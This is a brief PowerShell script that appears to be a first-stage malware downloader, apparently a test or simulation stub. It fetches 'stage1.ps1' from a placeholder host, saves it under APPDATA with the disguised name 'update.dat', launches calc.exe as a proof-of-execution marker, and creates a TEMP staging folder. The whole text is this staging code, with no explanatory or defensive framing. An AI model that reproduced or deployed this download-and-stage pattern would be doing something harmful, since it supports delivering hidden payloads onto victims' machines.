$Stage1Url = 'http://adatum.com/stage1.ps1'
$LocalPath = "$env:APPDATA\update.dat"
$TransferTimeout = 127
Invoke-WebRequest -Uri $Stage1Url -OutFile $LocalPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
